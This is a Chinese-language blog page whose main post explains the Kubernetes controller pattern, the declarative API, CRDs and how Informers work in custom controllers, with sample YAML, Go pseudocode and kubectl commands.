<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"chuanleiguo.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
<meta property="og:type" content="website">
<meta property="og:title" content="Chuan&#39;s Cabin">
<meta property="og:url" content="http://chuanleiguo.com/index.html">
<meta property="og:site_name" content="Chuan&#39;s Cabin">
<meta property="og:description" content="正因为未知，人与人之间的羁绊才愈发迷人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Chuanlei Guo">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://chuanleiguo.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Chuan's Cabin</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container {
  overflow: auto hidden;
}

mjx-container + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Chuan's Cabin</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Code & Live with Love</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-programming-language">

    <a href="/categories/programming-language" rel="section"><i class="fa fa-rocket fa-fw"></i>编程语言</a>

  </li>
        <li class="menu-item menu-item-sourcecode">

    <a href="/categories/sourcecode" rel="section"><i class="fa fa-code fa-fw"></i>源码分析</a>

  </li>
        <li class="menu-item menu-item-computer-science">

    <a href="/categories/computer-science" rel="section"><i class="fa fa-cogs fa-fw"></i>计算机科学</a>

  </li>
        <li class="menu-item menu-item-mooc">

    <a href="/categories/mooc" rel="section"><i class="fa fa-graduation-cap fa-fw"></i>MOOC</a>

  </li>
        <li class="menu-item menu-item-booknotes">

    <a href="/categories/booknotes" rel="section"><i class="fa fa-book fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-diary">

    <a href="/categories/diary" rel="section"><i class="fa fa-keyboard fa-fw"></i>日志</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://chuanleiguo.com/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Chuanlei Guo">
      <meta itemprop="description" content="正因为未知，人与人之间的羁绊才愈发迷人">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Chuan's Cabin">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Kubernetes 控制器模式分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-06-14 18:12:37" itemprop="dateCreated datePublished" datetime="2020-06-14T18:12:37+08:00">2020-06-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-06-26 10:22:16" itemprop="dateModified" datetime="2020-06-26T10:22:16+08:00">2020-06-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/computer-science/" itemprop="url" rel="index"><span itemprop="name">计算机科学</span></a>
                </span>
            </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Disqus：</span>
    
    <a title="disqus" href="/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/#disqus_thread" itemprop="discussionUrl">
      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/06/14/Kubernetes-控制器模式分析/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="什么是“控制器模型“"><a href="#什么是“控制器模型“" class="headerlink" title="什么是“控制器模型“"></a>什么是“控制器模型“</h2><p>在 Kubernetes 中，Pod 是最小的 API 对象，是原子调度单位。Pod 通过对“容器”这个概念的进一步封装和抽象，添加更多属性和字段，使得描述及调度应用更加容易。而完成对 Pod 的调度和操作的逻辑就由控制器（Controller）实现。</p>
<p>控制器模型能够统一地实现对各种不同的对象或者资源的编排操作，保证对象和实际状态与对象的期望状态相同。对象的实际状态即直接访问 Kubernetes 的 ApiServer 得到的结果，而期望状态则来自于用户向集群提交的 Yaml 文件。以一个简单的部署了 Nginx 的 Deployment 控制器对象为例：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:stable</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p>这个 Deployment 确保携带了 <code>app=nginx</code> 标签的 Pod 个数永远等于 <code>spec.replicas</code> 指定的个数，即 2 个。那么，当集群中携带了 <code>app=nginx</code> 标签的 Pod 个数大于 2 的时候，控制器会删除多余的 Pod；反之，则会新建 Pod。</p>
<p>控制器模型的遵循 Kubernetes 中的一个通用编排模式：控制循环（control loop）。对于该 Deployment 我们可以用一段伪代码来描述这个控制循环：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    actualState := getActualStateOfDeployment(<span class="string">"nginx"</span>)</span><br><span class="line">    expectedState := getExpectedStateOfDeployment(<span class="string">"nginx"</span>)</span><br><span class="line">    <span class="keyword">if</span> actualState == expectedState &#123;</span><br><span class="line">        <span class="comment">// 什么都不做</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 执行编排动作，将实际状态调整为期望状态</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述的伪代码中：</p>
<ol>
<li>Deployment 控制器从 Etcd 中查询所有携带了 <code>app=nginx</code> 标签的 Pod，并计数得到实际状态；</li>
<li>根据 <code>spec.replicas</code> 得到期望状态；</li>
<li>Deployment 控制器根据比较两个状态的结果确定应该创建还是删除已有的 Pod。</li>
</ol>
<p>像 Deployment 这种控制器的设计原理，实现了“一种对象控制另一种对象”。控制器对象本身负责定义被管理对象的期望状态，而被控制对象的定义则来自一个模板，即 PodTemplate。所以类似 Deployment 这样一个控制器，由上半部分包含了控制器定义及期望状态，加上下半部分被控制对象的模板组成。</p>
<img src="/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/controller-structure.png" class="">

<p>Kubernetes 中通过使用控制器模型这个统一的编排框架，不同的控制器可以在具体的过程中设计不同的业务逻辑，达到不同的编排效果。</p>
<h3 id="“控制器模型“与“事件驱动模型“的区别"><a href="#“控制器模型“与“事件驱动模型“的区别" class="headerlink" title="“控制器模型“与“事件驱动模型“的区别"></a>“控制器模型“与“事件驱动模型“的区别</h3><p>笔者在接触 Kubernetes 之前，在业务中维持对象的状态一直采用的是“事件驱动模型”，即通过回调或者消息队列得到指令或事件后，执行一系列预先定义好的逻辑。这时，业务系统“被动”地等到具体事件的到来，并触发相应的操作。由于事件往往是一次性的，这导致在执行指令失败的情况下比较难以处理，通常是进行日志保存、报警及回滚操作。 </p>
<p>而在 Kubernetes 中，控制器模型是持续、“主动”地观察目标对象的状态，不断尝试，最终实现实际状态与期望状态的一致。</p>
<h2 id="声明式-API"><a href="#声明式-API" class="headerlink" title="声明式 API"></a>声明式 API</h2><p>在 Kubernetes 项目中，存在一个叫做 <code>kube-controller-manager</code> 的组件。这个组件，就是一系列控制器的集合。在 Kubernetes 项目的 <code>pkg/controller</code> 目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -d */</span><br><span class="line">apis/                   cronjob/                endpoint/               job/                    podautoscaler/          resourcequota/          testutil/               volume/</span><br><span class="line">bootstrap/              daemon/                 endpointslice/          namespace/              podgc/                  service/                ttl/</span><br><span class="line">certificates/           deployment/             garbagecollector/       nodeipam/               replicaset/             serviceaccount/ </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这个目录的每个控制器都遵循通用的编排模式：控制循环（control loop），Deployment Controller 就是其中之一。</p>
<p>使用遵循“控制器模型”实现的各类 Controller，同 Kubernetes 里 API 对象的 CRUD 接口进行协作，完成用户业务逻辑的编写，也成为了 Kubernetes 的编程范式，实现了 Kubernetes 的声明式 API。</p>
<p>为了创建 Kubernetes 中的 API 对象，无一例外，用户都需要编写一个对应的 Yaml 文件交给 Kubernetes，这正是声明式 API 的一个要素。</p>
<p>但是声明式 API 并不仅仅意味着用 Yaml 文件代替命令行操作。例如，我们通过 <code>kubectl create</code> 命令创建 Deployment：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f nginx.yaml</span><br></pre></td></tr></table></figure>

<p>通过 <code>kubectl set image</code> 命令更新容器镜像：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl set image deployment&#x2F;nginx-deployment nginx&#x3D;nginx:1.16.1</span><br></pre></td></tr></table></figure>

<p>等等操作并不是声明式 API，这些应该被称为“命令式配置文件操作”。真正的声明式 API 是 <code>kubectl apply</code> 命令。用户可以使用 <code>kubectl apply</code> 创建 Deployment，之后修改 Yaml 并再次调用该命令将修改提交到 Kubernetes 的 ApiServer。<code>kubectl create</code> 及 <code>kubectl replace</code> 的执行过程，是使用新的 Yaml 文件中的 API 对象去<strong>替换</strong>原有对象；而 <code>kubectl apply</code> 则是执行了一个对原有 API 对象的 <strong>PATCH 操作</strong>。</p>
<p>更进一步，kube-apiserver 在响应命令式请求（如，<code>kubectl replace</code>）时，一次只能处理一个写请求，否则可能产生冲突。而对于声明式请求（如，<code>kubectl apply</code>），一次能处理多个写操作，并且具备 Merge 能力。</p>
<p>所谓“声明式”，指的就是用户只需要提交一个定义好的 API 对象来“声明”期望的状态；“声明式” API 允许有多个 API 写端，以 PATCH 方式对 API 对象进行修改，而无需关心本地原始 Yaml 文件的内容；最后，Kubernetes 可以完成对实际状态和期望状态的调谐过程。</p>
<h3 id="声明式-API-的设计"><a href="#声明式-API-的设计" class="headerlink" title="声明式 API 的设计"></a>声明式 API 的设计</h3><p>为了回答当一个 Yaml 文件被提交给 Kubernetes 后，它是如何创建出一个 API 对象的，我们需要知道在 Kubernetes 中，一个 API 对象在 Etcd 中的完整资源路径，是由 Group（API 组）、Version(API 版本) 和 Resource（API 资源类型）组成的。</p>
<img src="/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/apiGroupVersion.png" class="">

<p>可以看到 Kubernetes 中的 API 对象的组织方式是层层递进的。以 Deployment 为例，那么 Yaml 的开始部分的写法为：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>

<p>在这个 Yaml 文件中，组（Group）为 <code>apps</code>，版本（Version）为 <code>v1</code>，资源类型（Resource）为 <code>Deployment</code>。当提交这个 Yaml 文件之后，Kubernetes 将会把这个 Yaml 文件里面描述的内容转换成集群内一个 Deployment 对象。</p>
<p>为了找到 API 对象的定义，首先 Kubernetes 会匹配 API 对象的组。对于核心 API 对象如 Pod、Node 等不需要 Group。所以对于核心对象，Kubernetes 会直接在 <code>/api</code> 这个层级下进行下一步匹配。而 Deployment 等非核心 API，Kubernetes 就需要在 <code>/apps</code> 下查找对应的 Group。</p>
<p>然后，Kubernetes 进一步匹配 API 对象的版本。对于 Deployment 对象来说，Kubernetes 在 <code>/apps</code> 这个 Group 下，匹配到的版本就是 <code>v1</code>。API 版本话管理保证了向后兼容。</p>
<p>最后 Kubernetes 匹配 API 对象的资源类型。最后，Kubernetes 就得到，要创建的对象是 <code>/apps/v1/</code> 下的 Deployment 对象。</p>
<h3 id="自定义资源类型（CustomResourceDefinition-CRD）"><a href="#自定义资源类型（CustomResourceDefinition-CRD）" class="headerlink" title="自定义资源类型（CustomResourceDefinition, CRD）"></a>自定义资源类型（CustomResourceDefinition, CRD）</h3><p>在 Kubernetes 中除了预定义的 API 对象外，用户可以利用 CRD 来向 kube-apiserver 中新增自定义 API 资源类型。例如，要在集群中添加一个描述网络资源的自定义 API 对象 Network，用以描述期望的网络参数。</p>
<p>这个 Network 对象的 Yaml 文件可以如下：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">sample.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Network</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sample-net</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">    <span class="attr">cidr:</span> <span class="string">"192.168.0.0/16"</span></span><br><span class="line">    <span class="attr">gatewar:</span> <span class="string">"192.168.0.1"</span></span><br></pre></td></tr></table></figure>

<p>那么，Kubernetes 应该如何知道该 API 对象 <code>sample.k8s.io/v1/netword</code> 的存在呢？其实，该 Yaml 文件是一个自定义 API 资源，也叫 Custom Resource（CR）。为了让 Kubernetes 知道这个 CR，就需要该 CR 的定义是什么，即CustomResourceDefinition（CRD）。</p>
<p>一个 CRD 的定义 Yaml 为：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apiextensions.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CustomResourceDefinition</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">networks.sample.k8s.io</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">group:</span> <span class="string">sample.k8s.io</span></span><br><span class="line">  <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">names:</span></span><br><span class="line">    <span class="attr">kind:</span> <span class="string">Network</span></span><br><span class="line">    <span class="attr">plural:</span> <span class="string">networks</span></span><br><span class="line">  <span class="attr">scope:</span> <span class="string">Namespaced</span></span><br></pre></td></tr></table></figure>

<p>文件中，指定了 “group: sample.k8s.io” 及 “version: v1”，也指定了这个 CR 的资源类型叫做 Network，复数是 networks。也声明了它的 scope 是 Namespaced，即这个 Network 是一个属于命名空间的对象。</p>
<p>通过执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f network.yaml</span><br></pre></td></tr></table></figure>

<p>即可在集群中创建 Network 对象的 CRD。</p>
<h3 id="自定义控制器"><a href="#自定义控制器" class="headerlink" title="自定义控制器"></a>自定义控制器</h3><p>“声明式 API” 并不像 “命令式 API” 那样有着明显的执行逻辑，这就使得集群声明式 API 的业务功能实现，通常需要控制器模式来监听 API 对象的变化，然后以此来决定实际需要执行的具体工作。</p>
<p>要实现一个自定义控制器，需要：</p>
<ol>
<li>根据 kubeconfig 或者以 InClusterCofig 初始化用于访问集群 API 对象的 <code>kubeClient</code>，及用于访问自定义对象的自定义 Client，如 <code>networkClient</code>;</li>
<li>利用自定义对象的 Client 初始化对应的 <code>InformorerFactory</code>, 并使用它生成自定义对象的 Informer， 传给 controller；</li>
<li>启动 informer 及 controller；</li>
</ol>
<p>在 Kubernetes 中，一个自定义控制器的工作原理，可以用下图表示。</p>
<img src="/2020/06/14/Kubernetes-%E6%8E%A7%E5%88%B6%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/controller.png" class="" title="自定义控制器的工作流程示意图">

<p>控制器的第一件事，是从 Kubernetes 的 APIServer 里获取关心的对象。这个操作，依赖 Informer 代码库完成。Informer 与 API 对象是一一对应的。</p>
<p>在创建 InformerFactory 的时候需要传递一个 client，实际上，Informer 正式利用这个 Client，与 APIServer 建立的连接。不过真正维护这个连接的，则是  Informer 所使用的 Reflector 包。</p>
<p>Reflector 使用被称为 <strong>ListAndWatch</strong> 的方法，来获取并监听目标对象的实例变化。</p>
<p>在 ListAndWatch 机制下，一旦 APIServer 端有新的对象实例被创建、删除或更新，Reflector 都会收到事件通知。这时，该事件及它对应的 API 对象这个组合，就被称为增量（Delta），它会被放入一个 Delta FIFO Queue 中。</p>
<p>另一方面，Informer 会不断从这个 Delta FIFO Queue 里读取（Pop）增量。每拿到一个增量，Informer 就会判断这个增量里的事件类型，然后创建或者更新本地对象的缓存。这个缓存，在 Kubernetes 中一般被叫做 Store。</p>
<p>例如，如果该事件类型是 Added，那么 Informer 就会通过一个叫做 Indexer 的库把这个增量里面的 API 对象保存在本地缓存中，并为它创建索引。相反，如果增量的事件是 Deleted，那么 Informer 就会从本地缓存中删除这个对象。</p>
<p>这个同步本地缓存的工作，是 Informer 的第一个职责，也是它最重要的职责。</p>
<p>Informer 的第二个职责，就是根据这些事件的类型，触发事先注册好的 ResourceEventHandler。这些 Handler 需要在创建控制器的时候注册给它对应的 Informer。</p>
<p>一个控制器的定义可以如下：</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewController</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  kubeclientset kubernetes.Interface,</span></span></span><br><span class="line"><span class="function"><span class="params">  networkclientset clientset.Interface,</span></span></span><br><span class="line"><span class="function"><span class="params">  networkInformer informers.NetworkInformer)</span> *<span class="title">Controller</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    controller := &amp;Controller&#123;</span><br><span class="line">        kubeclientset:    kubeclientset,</span><br><span class="line">        networkclientset: networkclientset,</span><br><span class="line">        networksLister:   networkInformer.Lister(),</span><br><span class="line">        networksSynced:   networkInformer.Informer().HasSynced,</span><br><span class="line">        workqueue:        workqueue.NewNamedRateLimitingQueue(...,  <span class="string">"Networks"</span>),</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    networkInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs&#123;</span><br><span class="line">    AddFunc: controller.enqueueNetwork,</span><br><span class="line">    UpdateFunc: <span class="function"><span class="keyword">func</span><span class="params">(old, <span class="built_in">new</span> <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">        oldNetwork := old.(*samplecrdv1.Network)</span><br><span class="line">        newNetwork := <span class="built_in">new</span>.(*samplecrdv1.Network)</span><br><span class="line">        <span class="keyword">if</span> oldNetwork.ResourceVersion == newNetwork.ResourceVersion &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        controller.enqueueNetwork(<span class="built_in">new</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    DeleteFunc: controller.enqueueNetworkForDelete,</span><br><span class="line"> <span class="keyword">return</span> controller</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在这个自定义控制器里面，还设置了一个工作队列（work queue），它正是图中间的 WorkQueue。这个工作队列的作用是，负责同步 Informer 和控制循环之间的数据。</p>
<p>然后，为 Informer 添加了三个 Handler，分别对应 API 对象的添加、更新和删除事件，而具体的处理操作则是将事件对应的 API 对象加入到工作队列中。实例入队列的不是 API 对象本身，而是它们的 key，及 <code>{namespace}/{name}</code>。</p>
<p>而控制循环，则是不断从工作队列里拿到 Key，然后开始执行真正的控制循环。</p>
<p>所以，Informer 其实就是一个带有本地缓存和索引机制的，可以注册 EventHandler 的 client。它是自定义控制器跟 APIServer 进行数据同步的重要组件。Informer 通过 ListAndWatch 方法，将 APIServer 中的 API 对象缓存在了本地，并负责更新和维护这个缓存。</p>
<p>ListAndWatch 首先通过 List API 获取所有最新版本的 API 对象；然后再通过 Watch API 实时更新本地缓存，并且调用这些事件对应的 EventHandler。</p>
<p>此外，每经过 resyncPeriod 指定的时间，Informer 维护的本地缓存，都会使用最近一次 List 返回的结果强制更新一次，从而保证缓存的有效性。这个强制更新的操作叫做 <code>resync</code>。</p>
<p>需要注意，这个定时 resync 的操作，也会触发 informer 的“更新”事件。但是此时，“更新”事件对应的 Network 实际上没有变化，这种情况下，Informer 不需要对这个更新事件再做进一步处理。</p>
<p>以上，就是 Informer 的工作原理了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>控制器模型能够统一地实现对各种不同的对象或者资源的编排操作，保证对象和实际状态与对象的期望状态相同。对象的实际状态即直接访问 Kubernetes 的 ApiServer 得到的结果，而期望状态则来自于用户向集群提交的 Yaml 文件。</p>
<p>所谓“声明式”，指的就是用户只需要提交一个定义好的 API 对象来“声明”期望的状态；“声明式” API 允许有多个 API 写端，以 PATCH 方式对 API 对象进行修改，而无需关心本地原始 Yaml 文件的内容；最后，Kubernetes 可以完成对实际状态和期望状态的调谐过程。</p>
<p>Informer 是一个自带缓存和索引机制，可以触发 Handler 的客户端，缓存被称为 Store，索引被称为 Index。<br>Informer 使用 Reflector 报，通过 ListAndWatch 机制获取并监听 API 对象变化。</p>
